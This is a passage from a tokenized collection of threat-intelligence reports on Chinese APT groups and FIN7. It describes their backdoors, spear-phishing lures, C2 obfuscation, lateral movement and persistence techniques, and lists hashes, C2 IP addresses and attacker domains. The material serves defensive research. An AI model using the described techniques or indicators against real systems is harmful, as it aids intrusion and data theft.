this
backdoor
.
 
Similar
Targets
were
observed
where
the
threat
actors
utilized
this
backdoor
:
Japanese
Tech
Company
,
Taiwanese
Government
Organizations
,
Organizations
in
the
Asia-Pacific
Region
that
are
of
Interest
to
China
.
 
The
WATERSPOUT
backdoor
was
written
to
the
same
file
path
as
the
HIGHTIDE
backdoors
:
C:\DOCUMENTS
and
SETTINGS\{user}\LOCAL
SETTINGS\Temp\word.exe
,
C:\DOCUMENTS
and
SETTINGS\{user}\LOCAL
SETTINGS\Temp\winword.exe
.
 
WATERSPOUT
was
compiled
within
two
days
of
the
last
HIGHTIDE
backdoor
and
on
the
same
day
as
the
THREEBYTE
backdoor
.
 
APT12
closely
monitors
online
media
related
to
its
tools
and
operations
and
reacts
when
its
tools
are
publicly
disclosed
.
 
APT12
has
the
ability
to
adapt
quickly
to
public
exposures
with
new
tools
,
tactics
,
and
procedures
(
TTPs
)
.
 
Public
disclosures
may
result
in
an
immediate
change
in
APT12
s
tools
.
 
These
changes
may
be
temporary
and
FireEye
believes
they
are
aimed
at
decreasing
detection
of
their
tools
until
a
more
permanent
and
effective
TTP
change
can
be
implemented
(
e.g.
,
WATERSPOUT
)
.
 
Although
these
points
do
not
definitively
tie
WATERSPOUT
to
APT12
,
they
do
indicate
a
possible
connection
between
the
WATERSPOUT
campaign
,
the
THREEBYTE
campaign
,
and
the
HIGHTIDE
campaign
attributed
to
APT12
.
 
FireEye
believes
the
change
from
RIPTIDE
to
HIGHTIDE
represents
a
temporary
tool
shift
to
decrease
malware
detection
while
APT12
developed
a
completely
new
malware
toolset
.
 
These
development
efforts
may
have
resulted
in
the
emergence
of
the
WATERSPOUT
backdoor
.
 
Though
public
disclosures
resulted
in
APT12
adaptations
,
FireEye
observed
only
a
brief
pause
in
APT12
activity
before
the
threat
actors
returned
to
normal
activity
levels
.
 
Similarly
,
the
public
disclosure
of
APT12
s
intrusion
at
the
New
York
Times
also
led
to
only
a
brief
pause
in
the
threat
group
s
activity
and
immediate
changes
in
TTPs
.
 
The
pause
and
retooling
by
APT12
was
covered
in
the
Mandiant
2014
M-Trends
report
.
 
Currently
,
APT12
continues
to
target
organizations
and
conduct
cyber
operations
using
its
new
tools
.
 
Most
recently
,
FireEye
observed
HIGHTIDE
at
multiple
Taiwan-based
organizations
and
the
suspected
APT12
WATERSPOUT
backdoor
at
a
Japan-based
electronics
company
.
 
APT12
.
 
The
attackers
behind
the
breach
of
the
New
York
Times
computer
network
late
last
year
appear
to
be
mounting
fresh
assaults
that
leverage
new
and
improved
versions
of
malware
.
 
The
new
campaigns
mark
the
first
significant
stirrings
from
the
group
since
it
went
silent
in
January
in
the
wake
of
a
detailed
expose
of
the
group
and
its
exploits
and
a
retooling
of
what
security
researchers
believe
is
a
massive
spying
operation
based
in
China
.
 
The
newest
campaign
uses
updated
versions
of
Aumlib
and
Ixeshe
.
 
Aumlib
,
which
for
years
has
been
used
in
targeted
attacks
,
now
encodes
certain
HTTP
communications
.
 
FireEye
researchers
spotted
the
malware
when
analyzing
a
recent
attempted
attack
on
an
organization
involved
in
shaping
economic
policy
.
 
And
a
new
version
of
Ixeshe
,
which
has
been
in
service
since
2009
to
attack
targets
in
East
Asia
,
uses
new
network
traffic
patterns
,
possibly
to
evade
traditional
network
security
systems
.
 
The
updates
are
significant
for
both
of
the
longstanding
malware
families
;
before
this
year
,
Aumlib
had
not
changed
since
at
least
May
2011,
and
Ixeshe
had
not
evolved
since
at
least
December
2011
.
 
Cybercriminals
are
constantly
evolving
and
adapting
in
their
attempts
to
bypass
computer
network
defenses
.
 
But
,
larger
,
more
successful
threat
actors
tend
to
evolve
at
a
slower
rate
.
 
As
long
as
these
actors
regularly
achieve
their
objective
(
stealing
sensitive
data
)
,
they
are
not
motivated
to
update
or
rethink
their
techniques
,
tactics
,
or
procedures
(
TTPs
)
.
 
These
threat
actors
tactics
follow
the
same
principles
of
evolution
successful
techniques
propagate
,
and
unsuccessful
ones
are
abandoned
.
 
Attackers
do
not
change
their
approach
unless
an
external
force
or
environmental
shift
compels
them
to
.
 
As
the
old
saying
goes
:
If
it
aint
broke
,
dont
fix
it
.
 
So
when
a
larger
,
successful
threat
actor
changes
up
tactics
,
the
move
always
piques
our
attention
.
 
Naturally
,
our
first
priority
is
ensuring
that
we
detect
the
new
or
altered
TTPs
.
 
But
we
also
attempt
to
figure
out
why
the
adversary
changed
what
broke?
so
that
we
can
predict
if
and
when
they
will
change
again
in
the
future
.
 
We
observed
an
example
of
this
phenomenon
around
May
.
 
About
four
months
after
The
New
York
Times
publicized
an
attack
on
its
network
,
the
attackers
behind
the
intrusion
deployed
updated
versions
of
their
Backdoor.APT.Aumlib
and
Backdoor.APT.Ixeshe
malware
families
.
 
The
previous
versions
of
Aumlib
had
not
changed
since
at
least
May
2011,
and
Ixeshe
had
not
evolved
since
at
least
December
2011
.
 
We
cannot
say
for
sure
whether
the
attackers
were
responding
to
the
scrutiny
they
received
in
the
wake
of
the
episode
.
 
But
we
do
know
the
change
was
sudden
.
 
Akin
to
turning
a
battleship
,
retooling
TTPs
of
large
threat
actors
is
formidable
.
 
Such
a
move
requires
recoding
malware
,
updating
infrastructure
,
and
possibly
retraining
workers
on
new
processes
.
 
The
following
sections
detail
the
changes
to
Backdoor.APT.Aumlib
and
Backdoor.APT.Ixeshe
.
 
Backdoor.APT.Aumlib
:
A
recently
observed
malware
sample
(
hash
value
832f5e01be536da71d5b3f7e41938cfb
)
appears
to
be
a
modified
variant
of
Aumlib
.
 
The
sample
,
which
was
deployed
against
an
organization
involved
in
shaping
economic
policy
,
was
downloaded
from
the
following
URL
:
status.acmetoy.com
/DD/
myScript.js
or
status.acmetoy.com
/DD/
css.css
.
 
This
output
reveals
the
following
changes
when
compared
with
earlier
variants
:
The
POST
URI
is
changed
to
/bbs/
search.asp
(
as
mentioned
,
earlier
Aumlib
variants
used
a
POST
URI
of
/bbs/
info.asp
.
 
)
The
POST
body
is
now
encoded
.
 
These
subtle
changes
may
be
enough
to
circumvent
existing
IDS
signatures
designed
to
detect
older
variants
of
the
Aumlib
family
.
 
The
sample
832f5e01be536da71d5b3f7e41938cfb
shares
code
with
an
older
Aumlib
variant
with
the
hash
cb3dcde34fd9ff0e19381d99b02f9692
.
 
The
sample
cb3dcde34fd9ff0e19381d99b02f9692
connected
to
documents.myPicture.info
and
www.documents.myPicture.info
and
as
expected
generated
the
a
POST
request
to
/bbs/
info.asp
.
 
Backdoor.APT.Ixeshe
:
Ixeshe
has
been
used
in
targeted
attacks
since
2009,
often
against
entities
in
East
Asia
.
 
The
network
traffic
is
encoded
with
a
custom
Base64
alphabet
.
 
We
analyzed
a
recent
sample
that
appears
to
have
targeted
entities
in
Taiwan
,
a
target
consistent
with
previous
Ixeshe
activity
.
 
This
sample
(
aa873ed803ca800ce92a39d9a683c644
)
exhibited
network
traffic
that
does
not
match
the
earlier
pattern
and
therefore
may
evade
existing
network
traffic
signatures
designed
to
detect
Ixeshe
related
infections
.
 
APT16
.
 
Between
November
26,
2015,
and
December
1,
2015,
known
and
suspected
China
based
APT
groups
launched
several
spear
phishing
attacks
targeting
Japanese
and
Taiwanese
organizations
in
the
high-tech
,
government
services
,
media
and
financial
services
industries
.
 
Each
campaign
delivered
a
malicious
Microsoft
Word
document
exploiting
the
aforementioned
EPS
dict
copy
use-after-free
vulnerability
,
and
the
local
Windows
privilege
escalation
vulnerability
CVE-2015-1701
.
 
The
successful
exploitation
of
both
vulnerabilities
led
to
the
delivery
of
either
a
downloader
that
we
refer
to
as
IRONHALO
,
or
a
backdoor
that
we
refer
to
as
ELMER
.
 
On
November
26,
2015,
a
suspected
China
based
APT
group
sent
Japanese
defense
policy-themed
spear
phishing
emails
to
multiple
Japanese
financial
and
high-tech
companies
.
 
As
shown
in
Figure
1,
the
emails
originated
from
the
Yahoo
!
email
address
mts03282000@yahoo.co.jp
,
and
contained
the
subject
Sending
of
New
Year
No
.
 
Foreword
.
 
Each
phishing
message
contained
the
same
malicious
Microsoft
Word
attachment
.
 
The
malicious
attachment
resembled
an
article
hosted
on
a
legitimate
Japanese
defense-related
website
,
as
both
discussed
national
defense
topics
and
carried
the
same
byline
.
 
The
lure
documents
also
used
the
Japanese
calendar
,
as
indicated
by
the
27th
year
in
the
Heisei
period
.
 
This
demonstrates
that
the
threat
actors
understand
conventional
Japanese
date
notation
.
 
Following
the
exploitation
of
the
EPS
and
CVE-2015-1701
vulnerabilities
,
the
exploit
payload
drops
either
a
32-bit
or
64-bit
binary
containing
an
embedded
IRONHALO
malware
sample
.
 
IRONHALO
is
a
downloader
that
uses
the
HTTP
protocol
to
retrieve
a
Base64
encoded
payload
from
a
hard-coded
command-and-control
(
C2
)
server
and
uniform
resource
locator
(
URL
)
path
.
 
The
encoded
payload
is
written
to
a
temporary
file
,
decoded
and
executed
in
a
hidden
window
.
 
The
encoded
and
decoded
payloads
are
written
to
files
named
igfxHK[%rand%].dat
and
igfxHK[%rand%].exe
respectively
,
where
[%rand%]
is
a
4-byte
hexadecimal
number
based
on
the
current
timestamp
.
 
IRONHALO
:
AcroRd32Info.exe.exe
a8ccb2fc5fec1b89f778d93096f8dd65
.
 
IRONHALO
persists
by
copying
itself
to
the
current
user
s
Startup
folder
.
 
This
variant
sends
an
HTTP
request
to
a
legitimate
Japanese
website
using
a
malformed
User-Agent
string
,
as
shown
in
Figure
2
.
 
The
threat
actors
likely
compromised
the
legitimate
site
and
attempted
to
use
it
as
a
staging
server
for
second-stage
payloads
.
 
On
December
1,
2015,
threat
actors
launched
two
additional
spear
phishing
attacks
exploiting
the
undisclosed
EPS
vulnerability
and
CVE-2015-1701
.
 
Unlike
the
Nov.
26
campaign
,
these
attacks
targeted
Taiwanese
governmental
and
media
and
entertainment
organizations
.
 
Moreover
,
the
exploit
dropped
a
different
malware
payload
,
a
backdoor
we
refer
to
as
ELMER
.
 
The
first
spear
phishing
message
was
sent
to
a
Taiwanese
governmental
employee
on
Dec.
1
.
 
The
attachment
was
created
using
the
traditional
Chinese
character
set
,
and
contained
a
flowchart
that
appeared
to
be
taken
from
the
legitimate
Taiwanese
government
auction
website
http://shwoo.gov.taipei/buyer_flowchart.asp
.
 
The
second
December
spear
phishing
attack
targeted
Taiwan
based
news
media
organizations
.
 
The
emails
originated
from
the
address
dpptccb.dpp@msa.hinet.net
,
and
contained
the
subject
DPP's
Contact
Information
Update
.
 
Based
on
the
email
address
naming
convention
and
message
subject
,
the
threat
actors
may
have
tried
to
make
the
message
appear
to
be
a
legitimate
communication
from
the
Democratic
Progressive
Party
(
DPP
)
,
Taiwan
s
opposition
party
.
 
Unlike
the
previous
exploit
documents
,
this
malicious
attachment
did
not
contain
any
visible
text
when
opened
in
Microsoft
Word
.
 
The
exploit
documents
delivered
during
the
December
campaigns
dropped
a
binary
containing
an
embedded
variant
of
a
backdoor
we
refer
to
as
ELMER
.
 
ELMER
is
a
non-persistent
proxy-aware
HTTP
backdoor
written
in
Delphi
,
and
is
capable
of
performing
file
uploads
and
downloads
,
file
execution
,
and
process
and
directory
listings
.
 
To
retrieve
commands
,
ELMER
sends
HTTP
GET
requests
to
a
hard-coded
C2
server
,
and
parses
the
HTTP
response
packets
received
from
the
C2
server
for
an
integer
string
corresponding
to
the
command
that
needs
to
be
executed
.
 
Table
2
lists
the
ELMER
backdoors
observed
during
the
December
campaigns
.
 
The
ELMER
variant
6c33223db475f072119fe51a2437a542
beaconed
to
the
C2
IP
address
121.127.249.74
over
port
443
.
 
APT16
.
 
While
attribution
of
the
first
two
spear
phishing
attacks
is
still
uncertain
,
we
attribute
the
second
December
phishing
campaign
to
the
China
based
APT
group
that
we
refer
to
as
APT16
.
 
This
is
based
on
the
use
of
the
known
APT16
domain
rinpocheinfo.com
,
as
well
as
overlaps
in
previously
observed
targeting
and
tactics
,
techniques
and
procedures
(
TTPs
)
.
 
Taiwanese
citizens
will
go
to
the
polls
on
January
16
,
2016
,
to
choose
a
new
President
and
legislators
.
 
According
to
recent
opinion
polls
,
the
Democratic
Progressive
Party
(
DPP
)
candidate
Tsai
Ing-wen
is
leading
her
opponents
and
is
widely
expected
to
win
the
election
.
 
The
DPP
is
part
of
the
pan-green
coalition
that
favors
Taiwanese
independence
over
reunification
with
the
mainland
,
and
the
party
s
victory
would
represent
a
shift
away
from
the
ruling
Kuomintang
s
closer
ties
with
the
PRC
.
 
Since
1949
,
Beijing
has
claimed
Taiwan
as
a
part
of
China
and
strongly
opposes
any
action
toward
independence
.
 
The
Chinese
government
is
therefore
concerned
whether
a
DPP
victory
might
weaken
the
commercial
and
tourism
ties
between
China
and
Taiwan
,
or
even
drive
Taiwan
closer
to
independence
.
 
In
2005
,
the
Chinese
government
passed
an
anti-secession
law
that
signified
its
intention
to
use
non-peaceful
means
to
stymie
any
Taiwanese
attempt
to
secede
from
China
.
 
APT16
actors
sent
spear
phishing
emails
to
two
Taiwanese
media
organization
addresses
and
three
webmail
addresses
.
 
The
message
subject
read
DPP
s
Contact
Information
Update
,
apparently
targeting
those
interested
in
contact
information
for
DPP
members
or
politicians
.
 
The
Chinese
government
would
benefit
from
improved
insight
into
local
media
coverage
of
Taiwanese
politics
,
both
to
better
anticipate
the
election
outcome
and
to
gather
additional
intelligence
on
politicians
,
activists
,
and
others
who
interact
with
journalists
.
 
This
tactic
is
not
without
precedent
;
in
2013
,
the
New
York
Times
revealed
it
had
been
the
target
of
China
based
actors
shortly
after
it
reported
on
the
alleged
mass
accumulation
of
wealth
by
then-Prime
Minister
Wen
Jiabao
and
his
family
.
 
The
actors
likely
sought
information
on
the
newspaper
s
sources
in
China
,
who
could
be
silenced
by
the
government
.
 
Compromising
these
Taiwanese
news
organizations
would
also
allow
the
actors
to
gain
access
to
informants
or
other
protected
sources
,
who
might
then
be
targeted
for
further
intelligence
collection
or
even
retribution
.
 
The
webmail
addresses
,
while
unknown
,
were
possibly
the
personal-use
addresses
of
the
individuals
whose
corporate
domain
emails
were
targeted
.
 
As
corporate
networks
become
more
secure
and
users
become
more
vigilant
,
personal
accounts
can
still
offer
a
means
to
bypass
security
systems
.
 
This
tactic
exploits
users
reduced
vigilance
when
reading
their
own
personal
email
,
even
when
using
corporate
IT
equipment
to
do
so
.
 
On
the
same
date
that
APT16
targeted
Taiwanese
media
,
suspected
Chinese
APT
actors
also
targeted
a
Taiwanese
government
agency
,
sending
a
lure
document
that
contained
instructions
for
registration
and
subsequent
listing
of
goods
on
a
local
Taiwanese
auction
website
.
 
It
is
possible
,
although
not
confirmed
,
that
APT16
was
also
responsible
for
targeting
this
government
agency
,
given
both
the
timeframe
and
the
use
of
the
same
n-day
to
eventually
deploy
the
ELMER
backdoor
.
 
One
of
the
media
organizations
involved
in
this
latest
activity
was
targeted
in
June
2015
,
while
its
Hong
Kong
branch
was
similarly
targeted
in
August
2015
.
 
APT16
actors
were
likely
also
responsible
for
the
June
2015
activity
.
 
They
sent
spear
phishing
messages
with
the
subject
2015
Taiwan
Security
and
Cultural
Forum
Invitation
Form
,
and
used
a
different
tool
a
tool
that
we
refer
to
as
DOORJAMB
in
their
attempt
to
compromise
the
organization
.
 
A
different
group
,
known
as
admin@338
,
used
LOWBALL
malware
during
its
Hong
Kong
activity
.
 
Despite
the
differing
sponsorship
,
penetration
of
Hong
Kong
and
Taiwan
based
media
organizations
continues
to
be
a
priority
for
China
based
threat
groups
.
 
The
difference
in
sponsorship
could
be
the
result
of
tasking
systems
that
allocate
targeting
responsibility
to
different
groups
based
on
their
targets
geographic
location
.
 
In
other
words
,
while
media
organizations
are
important
targets
,
it
is
possible
that
two
separate
groups
are
responsible
for
Hong
Kong
and
Taiwan
,
respectively
.
 
The
suspected
APT16
targeting
of
the
Taiwanese
government
agency
in
addition
to
the
Taiwanese
media
organizations
further
supports
this
possibility
.
 
IRONHALO
:
CVE-2015-1701
.
 
ELMER
:
CVE-2015-1701
.
 
These
clusters
of
activity
raise
interesting
questions
about
the
use
of
an
identical
silently-patched
vulnerability
,
possibly
by
multiple
threat
groups
.
 
Both
Japan
and
Taiwan
are
important
intelligence
collection
targets
for
China
,
particularly
because
of
recent
changes
to
Japan
s
pacifist
constitution
and
the
upcoming
Taiwanese
election
.
 
Based
on
our
visibility
and
available
data
,
we
only
attribute
one
campaign
to
the
Chinese
APT
group
APT16
.
 
APT17
.
 
FireEye
Threat
Intelligence
and
the
Microsoft
Threat
Intelligence
Center
investigated
a
command-and-control
(
C2
)
obfuscation
tactic
used
on
Microsoft
s
TechNet
,
a
web
portal
for
IT
professionals
.
 
TechNet
s
security
was
in
no
way
compromised
by
this
tactic
,
which
is
likely
possible
on
other
message
boards
and
forums
.
 
FireEye
Threat
Intelligence
assesses
that
APT17
,
a
China
based
threat
group
,
was
behind
the
attempt
.
 
Other
groups
have
used
legitimate
websites
to
host
C2
IP
address
in
the
past
.
 
APT17
was
embedding
the
encoded
C2
IP
address
for
the
BLACKCOFFEE
malware
in
legitimate
Microsoft
TechNet
profiles
pages
and
forum
threads
,
a
method
some
in
the
information
security
community
call
a
dead
drop
resolver.
Encoding
the
IP
address
makes
it
more
difficult
to
identify
the
true
C2
address
for
network
security
professionals
.
 
Few
security
companies
have
publicly
discussed
this
tactic
.
 
After
discovering
the
BLACKCOFFEE
activity
,
the
FireEye-Microsoft
team
encoded
a
sinkhole
IP
address
into
the
profile
pages
and
forum
threads
and
locked
the
accounts
to
prevent
the
threat
actors
from
making
any
changes
.
 
This
collaborative
approach
allowed
the
team
to
observe
the
malware
and
its
victims
.
 
Though
the
security
community
has
not
yet
broadly
discussed
this
technique
,
FireEye
has
observed
other
threat
groups
adopting
these
measures
and
expect
this
trend
to
continue
on
other
community
sites
.
 
Today
,
FireEye
released
Indicators
of
Compromise
(
IOCs
)
for
BLACKCOFFEE
and
Microsoft
released
signatures
for
its
anti-malware
products
.
 
APT17
,
also
known
as
DeputyDog
,
is
a
Chinabased
threat
group
that
FireEye
Intelligence
has
observed
conducting
network
intrusions
against
U.S.
government
entities
,
the
defense
industry
,
law
firms
,
information
technology
companies
,
mining
companies
,
and
non-government
organizations
.
 
BLACKCOFFEE
s
functionality
includes
uploading
and
downloading
files
;
creating
a
reverse
shell
;
enumerating
files
and
processes
;
renaming
,
moving
,
and
deleting
files
;
terminating
processes
;
and
expanding
its
functionality
by
adding
new
backdoor
commands
.
 
FireEye
has
monitored
APT17
s
use
of
BLACKCOFFEE
variants
since
2013
to
masquerade
malicious
communication
as
normal
web
traffic
by
disguising
the
C2
communication
as
queries
to
web
search
engines
.
 
The
use
of
BLACKCOFFEE
demonstrates
threat
actors
evolving
use
of
public
websites
to
hide
in
plain
sight
.
 
In
the
past
,
threat
actors
would
modify
easily
compromised
websites
to
host
C2
commands
and
configuration
,
as
observed
in
the
China
based
APT1
s
WEBC2
suite
of
backdoors
.
 
Now
,
threat
actors
are
using
well-known
websitesthat
they
do
not
need
to
compromise
to
host
C2
IP
addresses
.
 
They
simply
use
the
website
for
legitimate
purposes
,
such
as
posting
forum
threads
or
creating
profile
pages
.
 
APT17
went
further
to
obfuscate
their
C2
IP
address
and
employed
a
multi-layered
approach
for
the
malware
to
finally
beacon
the
true
C2
IP
.
 
They
used
legitimate
infrastructurethe
ability
to
post
or
create
comments
on
forums
and
profile
pagesto
embed
a
string
that
the
malware
would
decode
to
find
and
communicate
with
the
true
C2
IP
address
.
 
This
additional
obfuscation
puts
yet
another
layer
between
APT17
and
the
security
professionals
attempting
to
chase
them
down
.
 
This
BLACKCOFFEE
variant
contains
one
or
more
URLs
that
link
to
the
biography
sections
of
attacker-created
profiles
as
well
as
forum
threads
that
contain
comments
from
those
same
profiles
.
 
A
URL
is
randomly
selected
and
the
malware
searches
at
that
location
for
an
encoded
IP
address
located
between
two
tags
,
@MICR0S0FT
and
C0RP0RATI0N
.
 
The
malware
then
communicates
directly
with
the
retrieved
and
decoded
IP
address
to
receive
commands
and
send
stolen
information
.
 
If
the
C2
server
is
discovered
or
shut
down
,
the
threat
actors
can
update
the
encoded
IP
address
on
TechNet
to
maintain
control
of
the
victims
machines
.
 
BLACKCOFFEE
supports
an
initial
set
of
fifteen
commands
,
including
creating
a
reverse
shell
,
uploading
and
downloading
files
,
and
enumerating
files
and
processes
.
 
The
attackers
can
also
extend
BLACKCOFFEE
s
functionality
through
additional
commands
sent
as
shellcode
.
 
APT17
:
de56eb5046e518e266e67585afa34612
.
 
APT17
:
195ade342a6a4ea0a58cfbfb43dc64cb
.
 
APT17
:
4c21336dad66ebed2f7ee45d41e6cada
.
 
APT17
:
0370002227619c205402c48bde4332f6
.
 
APT17
:
ac169b7d4708c6fa7fee9be5f7576414
.
 
APT17
:
130.184.156.62
.
 
APT17
:
69.80.72.165
.
 
APT17
:
110.45.151.43
.
 
APT17
:
121.101.73.231
.
 
APT18
.
 
Dell
SecureWorks
Counter
Threat
Unit
(
CTU
)
analysts
were
recently
engaged
with
a
client
thought
to
have
been
compromised
by
a
threat
group
CTU
researchers
have
named
Threat
Group-0416
(
TG-0416
)
.
 
Various
artifacts
from
the
initial
phases
of
the
incident
provided
strong
indications
of
the
existence
of
this
particular
threat
group
within
the
client's
infrastructure
.
 
TG-0416
is
a
stealthy
and
extremely
successful
Advanced
Persistent
Threat
(
APT
)
group
known
to
target
a
broad
range
of
verticals
since
at
least
2009
,
including
technology
,
industrial
,
manufacturing
,
human
rights
groups
,
government
,
pharmaceutical
,
and
medical
technology
.
 
The
threat
actors
achieved
an
initial
foothold
into
the
infrastructure
via
phishing
email
that
convinced
victims
to
install
the
Xyligan
remote
access
Trojan
(
RAT
)
on
a
system
.
 
The
threat
actors
then
installed
the
hcdLoader
RAT
,
which
installs
as
a
Windows
service
and
provides
command
line
access
to
the
compromised
system
.
 
Using
host-based
digital
forensic
analysis
,
CTU
analysts
observed
the
intruders
using
the
native
at.exe
Windows
task
scheduler
tool
to
move
laterally
within
the
infrastructure
.
 
Many
threat
groups
use
lateral
movement
techniques
,
but
this
engagement
allowed
CTU
analysts
to
not
only
further
validate
indicators
of
lateral
movement
,
but
also
to
look
a
bit
closer
at
those
indicators
and
expand
the
cluster
of
indicators
surrounding
the
use
of
at.exe
for
lateral
movement
within
the
infrastructure
.
 
Threat
actors
accessed
the
source
host
via
the
hcdLoader
RAT
.
 
The
sole
indicator
on
the
source
host
that
at.exe
had
been
run
was
an
application
Prefetch
file
(
C:\Windows\Prefetch\AT.EXE-BB02E639.pf
)
that
was
created
when
the
tool
was
executed
.
 
Beyond
the
file
system
metadata
for
the
Prefetch
file
(
creation
and
last
modification
times
)
and
the
last
execution
time
within
the
file
metadata
,
CTU
analysts
did
not
observe
any
indicators
of
value
on
the
source
host
.
 
Two
files
are
created
for
the
task
at
approximately
the
same
time
:
C:\Windows\System32\Tasks\At1
and
C:\Windows\Tasks\At1.job
.
 
The
first
file
is
an
Extensible
Markup
Language
(
XML
)
file
that
can
be
opened
and
viewed
in
a
text
editor
.
 
The
second
file
follows
a
decodable
binary
format
.
 
The
operating
system
also
creates
a
registry
key
within
the
software
registry
hive
that
is
specifically
associated
with
the
creation
of
the
scheduled
task
on
the
destination
host
:
Microsoft\Windows
NT\CurrentVersion\Schedule\TaskCache\Tree\At1
.
 
The
Task
Scheduler
service
names
the
tasks
,
so
subsequent
tasks
are
named
At2
,
At3
,
and
so
on
.
 
FIN7.5
:
the
infamous
cybercrime
rig
FIN7
continues
its
activities
.
 
On
August
1,
2018
,
the
US
Department
of
Justice
announced
that
it
had
arrested
several
individuals
suspected
of
having
ties
to
the
FIN7
cybercrime
rig
.
 
FIN7
operations
are
linked
to
numerous
intrusion
attempts
having
targeted
hundreds
of
companies
since
at
least
as
early
as
2015
.
 
Interestingly
,
this
threat
actor
created
fake
companies
in
order
to
hire
remote
pentesters
,
developers
and
interpreters
to
participate
in
their
malicious
business
.
 
The
main
goal
behind
its
malicious
activities
was
to
steal
financial
assets
from
companies
,
such
as
debit
cards
,
or
get
access
to
financial
data
or
computers
of
finance
department
employees
in
order
to
conduct
wire
transfers
to
offshore
accounts
.
 
In
2018-2019
,
researchers
of
Kaspersky
Lab
s
Global
Research
and
Analysis
Team
analyzed
various
campaigns
that
used
the
same
Tactics
Tools
and
Procedures
(
TTPs
)
as
the
historic
FIN7
,
leading
the
researchers
to
believe
that
this
threat
actor
had
remained
active
despite
the
2018
arrests
.
 
In
addition
,
during
the
investigation
,
we
discovered
certain
similarities
to
other
attacker
groups
that
seemed
to
share
or
copy
the
FIN7
TTPs
in
their
own
operations
.
 
The
FIN7
intrusion
set
continued
its
tailored
spear
phishing
campaigns
throughout
last
year
.
 
Kaspersky
Lab
has
been
able
to
retrieve
some
of
these
exchanges
from
a
FIN7
target
.
 
The
spear
phishing
campaigns
were
remarkably
sophisticated
from
a
social
engineering
perspective
.
 
In
various
cases
,
the
operators
exchanged
numerous
messages
with
their
victims
for
weeks
before
sending
their
malicious
documents
.
 
The
emails
were
efficient
social-engineering
attempts
that
appealed
to
a
vast
number
of
human
emotions
(
fear
,
stress
,
anger
,
etc.
)
to
elicit
a
response
from
their
victims
.
 
One
of
the
domains
used
by
the
attackers
in
their
2018
campaign
of
spear
phishing
contained
more
than
130
email
aliases
,
leading
us
to
think
that
more
than
130
companies
had
been
targeted
by
the
end
of
2018
.
 
We
have
seen
two
types
of
documents
sent
to
victims
in
these
spear
phishing
campaigns
.
 
The
first
one
exploits
the
INCLUDEPICTURE
feature
of
Microsoft
Word
to
get
context
information
about
the
victims
computer
,
and
the
availability
and
version
number
of
Microsoft
Word
.
 
The
second
one
,
which
in
many
cases
is
an
Office
document
protected
with
a
trivial
password
,
such
as
12345
,
1234
,
etc.
,
uses
macros
to
execute
a
GRIFFON
implant
on
the
targets
computer
.
 
In
various
cases
,
the
associated
macro
also
scheduled
tasks
to
make
GRIFFON
persistent
.
 
Interestingly
,
following
some
open-source
publications
about
them
,
the
FIN7
operators
seems
to
have
developed
a
homemade
builder
of
malicious
Office
document
using
ideas
from
ThreadKit
,
which
they
employed
during
the
summer
of
2018
.
 
The
new
builder
inserts
random
values
in
the
Author
and
Company
metadata
fields
.
 
Moreover
,
the
builder
allows
these
to
modify
different
IOCs
,
such
as
the
filenames
of
wscript.exe
or
sctasks.exe
copies
,
etc
.
 
The
GRIFFON
implant
is
a
lightweight
JScript
validator-style
implant
without
any
persistence
mechanism
.
 
The
malware
is
designed
for
receiving
modules
to
be
executed
in-memory
and
sending
the
results
to
C2s
.
 
We
were
able
to
obtain
four
different
modules
during
the
investigation
.
 
The
first
module
downloaded
by
the
GRIFFON
malware
to
the
victims
computer
is
an
information-gathering
JScript
,
which
allows
the
cybercriminals
to
understand
the
context
of
the
infected
workstation
.
 
This
module
mainly
relies
on
WMI
and
Windows
objects
to
deliver
results
,
which
will
be
sent
back
to
the
operators
.
 
Interestingly
,
more
than
20
artifacts
are
retrieved
from
the
system
by
this
implant
during
the
reconnaissance
stage
,
from
the
date
and
time
of
operating
system
installation
and
membership
in
a
Windows
domain
to
a
list
of
and
the
resolutions
of
the
workstations
monitors
.
 
The
second
module
is
used
by
the
operators
to
execute
an
obfuscated
PowerShell
script
,
which
contains
a
Meterpreter
downloader
widely
known
as
Tinymet
.
 
This
downloader
,
seen
in
past
FIN7
campaigns
,
downloads
a
one-byte
XOR
encrypted
(
eg.
with
the
key
equal
to
0x50
or
0x51
)
piece
of
meterpreter
shellcode
to
execute
.
 
The
third
module
allows
the
operators
to
take
a
screenshot
of
the
remote
system
.
 
To
do
that
,
it
also
drops
a
PowerShell
script
on
the
workstation
to
execute
.
 
The
script
executes
an
open-source
.NET
class
used
for
taking
a
screenshot
.
 
The
resulting
screenshot
is
saved
at
%TMP%/image.png
,
sent
back
to
the
attackers
by
the
GRIFFON
implant
and
then
deleted
.
 
The
last
retrieved
module
is
a
persistence
module
.
 
If
the
victim
appears
valuable
to
the
attackers
,
a
GRIFFON
implant
installer
is
pushed
to
the
victims
workstation
.
 
This
module
stores
another
instance
of
the
GRIFFON
implant
inside
the
registry
to
achieve
persistence
.
 
Here
is
a
PowerLinks
style
method
used
by
the
attackers
to
achieve
persistence
and
execute
the
GRIFFON
implant
at
each
user
logon
.
 
The
new
GRIFFON
implant
is
written
to
the
hard
drive
before
each
execution
,
limiting
the
file-less
aspect
of
this
method
.
 
Through
its
light
weight
and
modular
architecture
,
the
GRIFFON
implant
is
the
perfect
validator
.
 
Even
though
we
have
been
able
to
retrieve
four
different
modules
,
it
is
possible
that
the
FIN7
operators
have
more
modules
in
their
toolsets
for
achieving
their
objectives
on
the
victims
workstation
.
 
Attackers
make
mistakes
,
and
FIN7
are
no
exception
.
 
The
major
error
made
by
its
operators
allowed
us
to
follow
the
command
and
control
server
of
the
GRIFFON
implant
last
year
.
 
In
order
to
trick
blue
teams
and
other
DFIR
analysts
,
the
operators
created
fake
HTTP
302
redirection
to
various
Google
services
on
their
C2s
servers
.
 
This
error
allowed
us
to
follow
the
infrastructure
week
by
week
,
until
an
individual
pushed
on
Twitter
the
heuristic
to
track
their
C2
at
the
end
of
December
2018
.
 
A
few
days
after
the
tweet
,
in
January
2019
,
the
operators
changed
their
landing
page
in
order
to
prevent
this
type
of
tracking
against
their
infrastructure
.
 
During
the
investigation
related
to
the
GRIFFON
infrastructure
,
we
found
a
strange
overlap
between
the
WHOIS
record
of
an
old
GRIFFON
C2
and
the
website
of
a
fake
company
.
 
According
to
the
website
,
that
domain
supposedly
belongs
to
a
legitimate
security
company
fully
owned
by
the
Russian
Government
(
sic
.
 
)
and
having
offices
in
Moscow
,
Saint
Petersburg
and
Yekaterinburg
,
but
the
address
says
the
company
is
located
in
Trump
Tower
,
in
New
York
.
 
Given
FIN7
s
previous
use
of
false
security
companies
,
we
decided
to
look
deeper
into
this
one
.
 
As
we
were
looking
at
the
content
of
the
website
,
it
